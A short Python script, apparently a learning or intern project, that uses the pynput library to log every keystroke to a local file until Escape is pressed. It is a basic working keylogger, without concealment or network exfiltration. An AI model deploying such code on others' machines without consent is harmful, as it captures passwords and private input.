from pynput.keyboard import Key, Listener

# Path to the log file where keystrokes will be saved
log_file = "E://learn/projintern/keystrokes.log"

def on_press(key):
    try:
        # Write the pressed key to the log file
        with open(log_file, "a") as f:
            f.write(f"{key} ")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_release(key):
    # Stop the listener if the Escape key is pressed
    if key == Key.esc:
        return False

# Start the listener to monitor keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Keep the listener running
    listener.join()
